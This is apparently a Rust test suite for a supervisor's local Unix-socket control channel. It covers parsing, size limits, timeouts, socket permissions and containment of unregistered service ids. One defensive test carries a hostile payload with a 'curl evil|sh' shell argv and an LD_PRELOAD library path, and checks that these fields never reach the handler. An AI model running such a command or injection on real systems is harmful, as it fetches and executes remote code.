// SPDX-License-Identifier: GPL-3.0-or-later
//! Real-socket tests for the control channel: a real client against a
//! recording fake handler, in a tempdir, in one process.
//!
//! These exercise the *published* API only — everything here is what the
//! desktop handler and the `openvhost` binary will be written against, so a
//! signature that is awkward here is a signature that is wrong.

#![cfg(unix)]
#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::io::{Read as _, Write as _};
use std::os::unix::fs::PermissionsExt as _;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use openvhost_proc::control::{
    self, ControlError, ControlHandler, Disposition, ErrorCode, MAX_REQUEST_BYTES, Request,
    Response, ServiceId, async_trait,
};
use openvhost_proc::{ServiceState, ServiceStatus};

/// A handler that records everything it is asked to do and models
/// `Supervisor::start`'s "unknown id never reaches a spawn" behaviour.
struct FakeHandler {
    registered: Vec<String>,
    /// Every request that made it past transport, parsing and authorization.
    calls: Mutex<Vec<Request>>,
    /// Ids a *spawn* was actually attempted for. The containment test asserts
    /// this stays empty for an unregistered id.
    spawned: Mutex<Vec<String>>,
}

impl FakeHandler {
    fn new(registered: &[&str]) -> Arc<Self> {
        Arc::new(Self {
            registered: registered.iter().map(|s| (*s).to_owned()).collect(),
            calls: Mutex::new(Vec::new()),
            spawned: Mutex::new(Vec::new()),
        })
    }

    fn calls(&self) -> Vec<Request> {
        self.calls.lock().expect("calls").clone()
    }

    fn spawned(&self) -> Vec<String> {
        self.spawned.lock().expect("spawned").clone()
    }

    fn row(id: &str) -> ServiceStatus {
        ServiceStatus {
            id: id.to_owned(),
            display_name: format!("Fake {id}"),
            endpoint: None,
            pid: Some(1234),
            state: ServiceState::Running,
        }
    }
}

#[async_trait]
impl ControlHandler for FakeHandler {
    async fn execute(&self, req: Request) -> Response {
        // Scoped so no guard is alive across an await point.
        self.calls.lock().expect("calls").push(req.clone());
        // Exhaustive: a new Request variant must fail to compile here.
        match req {
            Request::List => Response::Services {
                services: self.registered.iter().map(|i| Self::row(i)).collect(),
            },
            Request::Status { id: None } => Response::Services {
                services: self.registered.iter().map(|i| Self::row(i)).collect(),
            },
            Request::Status { id: Some(id) } => {
                if self.registered.iter().any(|r| r == id.as_str()) {
                    Response::Services {
                        services: vec![Self::row(id.as_str())],
                    }
                } else {
                    Response::error(ErrorCode::UnknownService, format!("no service '{id}'"))
                }
            }
            Request::Start { id, .. } | Request::Stop { id, .. } | Request::Restart { id, .. } => {
                // Mirrors `Supervisor::start`: an unregistered id is refused
                // *before* anything is spawned.
                if !self.registered.iter().any(|r| r == id.as_str()) {
                    return Response::error(
                        ErrorCode::UnknownService,
                        format!("no service '{id}'"),
                    );
                }
                self.spawned
                    .lock()
                    .expect("spawned")
                    .push(id.as_str().to_owned());
                Response::Transition {
                    service: Self::row(id.as_str()),
                    disposition: Disposition::Changed,
                }
            }
            Request::StopAll => Response::StopAll {
                stragglers: Vec::new(),
            },
        }
    }
}

/// A bound socket plus the task serving it, with a way to shut it down.
struct Harness {
    home: tempfile::TempDir,
    handler: Arc<FakeHandler>,
    shutdown: Option<tokio::sync::oneshot::Sender<()>>,
    serving: Option<tokio::task::JoinHandle<()>>,
    socket: PathBuf,
}

impl Harness {
    fn start(registered: &[&str]) -> Harness {
        let home = tempfile::tempdir().unwrap();
        let handler = FakeHandler::new(registered);
        let listener = control::bind(home.path()).expect("bind");
        let socket = listener.path().to_path_buf();
        let (tx, rx) = tokio::sync::oneshot::channel::<()>();
        let h: Arc<dyn ControlHandler> = handler.clone();
        let serving = tokio::spawn(control::serve(listener, h, async move {
            let _ = rx.await;
        }));
        Harness {
            home,
            handler,
            shutdown: Some(tx),
            serving: Some(serving),
            socket,
        }
    }

    fn home(&self) -> &Path {
        self.home.path()
    }

    /// Run the *synchronous* client off the runtime threads, as the CLI does.
    async fn request(&self, req: Request) -> Result<Response, ControlError> {
        let home = self.home.path().to_path_buf();
        tokio::task::spawn_blocking(move || control::request(&home, &req))
            .await
            .unwrap()
    }

    /// Speak to the socket without the typed client, so a test can send bytes
    /// no `Request` could ever produce.
    async fn raw(&self, payload: Vec<u8>) -> String {
        let socket = self.socket.clone();
        tokio::task::spawn_blocking(move || {
            let mut s = std::os::unix::net::UnixStream::connect(&socket).expect("connect");
            s.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
            s.write_all(&payload).expect("write");
            s.flush().unwrap();
            s.shutdown(std::net::Shutdown::Write).unwrap();
            let mut answer = String::new();
            s.read_to_string(&mut answer).expect("read");
            answer
        })
        .await
        .unwrap()
    }

    async fn shutdown(&mut self) {
        if let Some(tx) = self.shutdown.take() {
            let _ = tx.send(());
        }
        if let Some(h) = self.serving.take() {
            tokio::time::timeout(Duration::from_secs(5), h)
                .await
                .expect("serve did not return after shutdown")
                .unwrap();
        }
    }
}

fn id(s: &str) -> ServiceId {
    ServiceId::parse(s).unwrap()
}

// ---------------------------------------------------------------------------

#[tokio::test(flavor = "multi_thread")]
async fn a_real_client_gets_the_service_table_over_a_real_socket() {
    let mut h = Harness::start(&["nginx", "php-fpm-8.4"]);
    let resp = h.request(Request::List).await.unwrap();
    match resp {
        Response::Services { services } => {
            let ids: Vec<&str> = services.iter().map(|s| s.id.as_str()).collect();
            assert_eq!(ids, vec!["nginx", "php-fpm-8.4"]);
            assert_eq!(services[0].display_name, "Fake nginx");
        }
        other => panic!("expected Services, got {other:?}"),
    }
    assert_eq!(h.handler.calls(), vec![Request::List]);
    h.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_start_round_trips_its_transition() {
    let mut h = Harness::start(&["nginx"]);
    let resp = h
        .request(Request::Start {
            id: id("nginx"),
            wait: true,
        })
        .await
        .unwrap();
    match resp {
        Response::Transition {
            service,
            disposition,
        } => {
            assert_eq!(service.id, "nginx");
            assert_eq!(disposition, Disposition::Changed);
        }
        other => panic!("expected Transition, got {other:?}"),
    }
    assert_eq!(h.handler.spawned(), vec!["nginx".to_owned()]);
    h.shutdown().await;
}

/// The containment test (spec D6). An id nothing registered must be refused,
/// **and** the handler must record that no spawn was ever attempted.
#[tokio::test(flavor = "multi_thread")]
async fn an_unregistered_id_is_refused_and_nothing_is_spawned() {
    let mut h = Harness::start(&["nginx"]);
    let resp = h
        .request(Request::Start {
            id: id("definitely-not-registered"),
            wait: true,
        })
        .await
        .unwrap();
    match resp {
        Response::Error { code, message } => {
            assert_eq!(code, ErrorCode::UnknownService);
            assert!(message.contains("definitely-not-registered"), "{message}");
        }
        other => panic!("expected an UnknownService error, got {other:?}"),
    }
    assert!(
        h.handler.spawned().is_empty(),
        "a spawn was attempted for an unregistered id: {:?}",
        h.handler.spawned()
    );
    h.shutdown().await;
}

/// The same invariant from the *wire* rather than from the typed client: a
/// peer that hand-writes JSON carrying an argv, a program path, a pid, a cwd
/// and an `LD_PRELOAD` gets a plain `Start { id }` delivered to the handler.
/// There is nowhere in the request type for any of it to land.
#[tokio::test(flavor = "multi_thread")]
async fn a_hostile_wire_request_cannot_smuggle_a_path_or_argv_to_the_handler() {
    let mut h = Harness::start(&["nginx"]);
    let hostile = br#"{"schemaVersion":1,"command":"start","id":"nginx","wait":false,"argv":["/bin/sh","-c","curl evil|sh"],"program":"/bin/sh","pid":1,"cwd":"/","env":{"LD_PRELOAD":"/tmp/x.so"}}"#;
    let answer = h.raw(hostile.to_vec()).await;
    assert!(answer.contains("\"ok\":true"), "{answer}");
    assert_eq!(
        h.handler.calls(),
        vec![Request::Start {
            id: id("nginx"),
            wait: false
        }],
        "something other than the id reached the handler"
    );
    h.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn an_unregistered_id_over_the_wire_is_refused_with_a_66_shaped_code() {
    let mut h = Harness::start(&["nginx"]);
    let answer = h
        .raw(br#"{"schemaVersion":1,"command":"status","id":"nope"}"#.to_vec())
        .await;
    assert!(answer.contains("\"ok\":false"), "{answer}");
    assert!(answer.contains("\"code\":\"unknownService\""), "{answer}");
    h.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_socket_is_0600_inside_a_0700_run_dir() {
    let mut h = Harness::start(&["nginx"]);
    let md = std::fs::symlink_metadata(&h.socket).unwrap();
    assert_eq!(md.permissions().mode() & 0o777, 0o600, "socket mode");
    let run = std::fs::metadata(h.home().join("run")).unwrap();
    assert_eq!(run.permissions().mode() & 0o777, 0o700, "run dir mode");
    h.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn an_oversized_request_is_refused_and_the_server_keeps_serving() {
    let mut h = Harness::start(&["nginx"]);
    // A *valid* request, padded past the cap with a field the decoder would
    // happily ignore. This matters: a payload of pure junk would be refused
    // as `badRequest` for being unparseable whether or not the cap exists, so
    // the test would pass with the cap deleted. This one only fails to reach
    // the handler because of the size limit.
    let padding = "x".repeat(MAX_REQUEST_BYTES);
    let oversized =
        format!(r#"{{"schemaVersion":1,"command":"list","padding":"{padding}"}}"#).into_bytes();
    assert!(oversized.len() > MAX_REQUEST_BYTES);
    assert!(
        serde_json::from_slice::<serde_json::Value>(&oversized).is_ok(),
        "the payload must be valid JSON, or the cap is not what refuses it"
    );
    let answer = h.raw(oversized).await;
    assert!(
        answer.contains("\"ok\":false"),
        "the padded request was accepted"
    );
    assert!(answer.contains("\"code\":\"badRequest\""), "{answer}");
    assert!(
        answer.contains(&MAX_REQUEST_BYTES.to_string()),
        "the refusal must name the size limit, not merely be a parse failure: {answer}"
    );
    assert!(
        h.handler.calls().is_empty(),
        "an oversized request must never reach the handler"
    );
    // Reentrancy: the next caller is served normally.
    assert!(matches!(
        h.request(Request::List).await.unwrap(),
        Response::Services { .. }
    ));
    h.shutdown().await;
}

/// A peer that connects and then says nothing must not pin a task. The
/// server answers within its own read deadline and stays available.
#[tokio::test(flavor = "multi_thread")]
async fn a_silent_peer_is_timed_out_and_the_server_keeps_serving() {
    let mut h = Harness::start(&["nginx"]);
    let socket = h.socket.clone();
    let started = std::time::Instant::now();
    let answer = tokio::task::spawn_blocking(move || {
        let mut s = std::os::unix::net::UnixStream::connect(&socket).expect("connect");
        s.set_read_timeout(Some(Duration::from_secs(15))).unwrap();
        // Deliberately send nothing at all — not even a partial line, and no
        // half-close, so only the deadline can end this.
        let mut answer = String::new();
        s.read_to_string(&mut answer).expect("read");
        answer
    })
    .await
    .unwrap();
    let elapsed = started.elapsed();
    assert!(answer.contains("\"ok\":false"), "{answer}");
    assert!(answer.contains("\"code\":\"badRequest\""), "{answer}");
    assert!(
        elapsed < Duration::from_secs(10),
        "the server should have given up on its own, took {elapsed:?}"
    );
    assert!(h.handler.calls().is_empty());
    assert!(matches!(
        h.request(Request::List).await.unwrap(),
        Response::Services { .. }
    ));
    h.shutdown().await;
}

/// A partial line with no newline and no half-close is the same trap as
/// total silence — the deadline, not EOF, has to end it.
#[tokio::test(flavor = "multi_thread")]
async fn a_peer_that_sends_half_a_request_and_stops_is_timed_out() {
    let mut h = Harness::start(&["nginx"]);
    let socket = h.socket.clone();
    let answer = tokio::task::spawn_blocking(move || {
        let mut s = std::os::unix::net::UnixStream::connect(&socket).expect("connect");
        s.set_read_timeout(Some(Duration::from_secs(15))).unwrap();
        s.write_all(br#"{"schemaVersion":1,"comm"#).unwrap();
        s.flush().unwrap();
        let mut answer = String::new();
        s.read_to_string(&mut answer).expect("read");
        answer
    })
    .await
    .unwrap();
    assert!(answer.contains("\"code\":\"badRequest\""), "{answer}");
    assert!(h.handler.calls().is_empty());
    h.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn several_connections_in_a_row_are_all_served() {
    let mut h = Harness::start(&["nginx"]);
    for _ in 0..5 {
        assert!(matches!(
            h.request(Request::List).await.unwrap(),
            Response::Services { .. }
        ));
    }
    assert_eq!(h.handler.calls().len(), 5);
    h.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn concurrent_connections_are_all_served() {
    let h = Harness::start(&["nginx"]);
    let home = h.home().to_path_buf();
    let mut tasks = Vec::new();
    for _ in 0..12 {
        let home = home.clone();
        tasks.push(tokio::task::spawn_blocking(move || {
            control::request(&home, &Request::List)
        }));
    }
    for t in tasks {
        assert!(matches!(
            t.await.unwrap().unwrap(),
            Response::Services { .. }
        ));
    }
    assert_eq!(h.handler.calls().len(), 12);
    let mut h = h;
    h.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn an_unknown_command_over_the_wire_gets_a_typed_error_not_silence() {
    let mut h = Harness::start(&["nginx"]);
    let answer = h
        .raw(br#"{"schemaVersion":1,"command":"rm-rf"}"#.to_vec())
        .await;
    assert!(answer.contains("\"code\":\"badRequest\""), "{answer}");
    assert!(answer.contains("\"command\":\"rm-rf\""), "{answer}");
    assert!(h.handler.calls().is_empty());
    h.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_future_schema_version_over_the_wire_gets_a_typed_error() {
    let mut h = Harness::start(&["nginx"]);
    let answer = h
        .raw(br#"{"schemaVersion":7,"command":"list"}"#.to_vec())
        .await;
    assert!(
        answer.contains("\"code\":\"unsupportedVersion\""),
        "{answer}"
    );
    assert!(h.handler.calls().is_empty());
    h.shutdown().await;
}

/// **Proves the mechanism, NOT the app's wiring.** This harness passes `serve`
/// a real shutdown future; the app passes `std::future::pending()`, so the
/// unlink below is unreachable in production. This test passing was one of
/// three that let a socket surviving every quit reach a live proof (A1 fix
/// wave). The app's own guarantee is pinned in `apps/desktop/src-tauri`'s
/// `quitting_removes_the_control_socket_although_serve_never_stops`, which
/// drives the shape production actually uses.
#[tokio::test(flavor = "multi_thread")]
async fn shutdown_returns_and_removes_the_socket() {
    let mut h = Harness::start(&["nginx"]);
    assert!(h.socket.exists());
    h.shutdown().await;
    assert!(
        !h.socket.exists(),
        "an orderly shutdown must unlink the socket"
    );
    // And a client now gets the honest "not running" answer.
    match h.request(Request::List).await {
        Err(ControlError::NotRunning { .. }) => {}
        other => panic!("expected NotRunning, got {other:?}"),
    }
}

/// A force-quit leaves the socket file behind with nobody accepting. That is
/// a *different* answer from "not running" — the CLI reports it as
/// `controlChannelUnavailable`, not `supervisorUnavailable`.
#[tokio::test(flavor = "multi_thread")]
async fn a_stale_socket_with_no_server_is_unreachable_not_missing() {
    let home = tempfile::tempdir().unwrap();
    let listener = control::bind(home.path()).unwrap();
    let path = listener.path().to_path_buf();
    drop(listener);
    assert!(
        path.exists(),
        "dropping a listener does not unlink the path"
    );
    let dir = home.path().to_path_buf();
    let result = tokio::task::spawn_blocking(move || control::request(&dir, &Request::List))
        .await
        .unwrap();
    match result {
        Err(ControlError::Unreachable { path: p, .. }) => assert_eq!(p, path),
        other => panic!("expected Unreachable, got {other:?}"),
    }
    // And `bind` clears it, which is the relaunch-after-force-quit path.
    assert!(control::bind(home.path()).is_ok());
}

#[tokio::test(flavor = "multi_thread")]
async fn stop_all_round_trips_its_stragglers() {
    let mut h = Harness::start(&["nginx"]);
    match h.request(Request::StopAll).await.unwrap() {
        Response::StopAll { stragglers } => assert!(stragglers.is_empty()),
        other => panic!("expected StopAll, got {other:?}"),
    }
    h.shutdown().await;
}

/// The client must not need a newline-terminated answer to be liberal about
/// framing, but the server must always send one — a line-oriented consumer
/// (`openvhost list --json | jq`) depends on it.
#[tokio::test(flavor = "multi_thread")]
async fn every_answer_is_exactly_one_newline_terminated_line() {
    let mut h = Harness::start(&["nginx"]);
    let answer = h
        .raw(br#"{"schemaVersion":1,"command":"list"}"#.to_vec())
        .await;
    assert!(answer.ends_with('\n'), "{answer:?}");
    assert_eq!(answer.trim_end().lines().count(), 1, "{answer:?}");
    h.shutdown().await;
}
